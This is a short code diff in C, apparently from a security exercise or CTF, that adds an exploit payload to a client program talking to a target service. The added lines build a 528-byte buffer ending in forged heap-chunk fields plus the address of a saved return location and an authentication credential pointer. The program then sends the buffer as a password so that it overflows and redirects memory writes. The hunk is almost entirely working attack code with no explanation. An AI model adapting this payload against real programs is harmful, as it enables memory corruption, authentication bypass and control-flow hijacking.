@@ -24,6 +24,27 @@ int main() {
     uint64_t cur_return_addr_loc = cur_auth_bp + 8;    
     uint64_t curr_auth_cred = cur_auth_bp - auth_bp_cred_dist;
     
+
+    put_str("u 1234567\n");
+    send();
+    get_formatted("%*s");
+
+    unsigned explsz = 528;
+    void* *expl = (void**)malloc(explsz);
+    // Initialize the buffer with '\1' to make the contents predictable.
+    memset((void*)expl, '\1', explsz);
+    expl[explsz/sizeof(void*)-4] = (void*) 0x0000000000000000;
+    expl[explsz/sizeof(void*)-3] = (void*) 0x00000000000001f0;
+    expl[explsz/sizeof(void*)-2] = (void*) cur_return_addr_loc;
+    expl[explsz/sizeof(void*)-1] = (void*) curr_auth_cred;
+
+    put_str("p ");
+    put_bin((char*)expl, explsz);
+    put_str("\n");
+    send();
+
+
+
     put_str("u 1234567\n");
     send();
     get_formatted("%*s");
